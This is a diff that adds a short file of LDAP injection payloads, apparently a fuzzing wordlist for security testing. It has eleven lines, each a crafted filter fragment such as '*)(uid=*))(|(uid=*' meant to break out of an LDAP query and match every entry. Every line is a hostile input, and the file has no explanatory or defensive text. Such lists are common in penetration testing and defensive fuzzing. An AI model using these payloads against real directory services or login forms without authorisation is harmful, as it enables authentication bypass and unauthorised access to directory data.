@@ -1,0 +1,11 @@
+*)(&
+*))%00
+)(cn=))\x00
+*|(objectclass=*)
+*)(uid=*))(|(uid=*
+*/*
+*
+*)(|(objectclass=*
+)(objectclass=*)
+*)(objectclass=*
+*(objectclass=*)
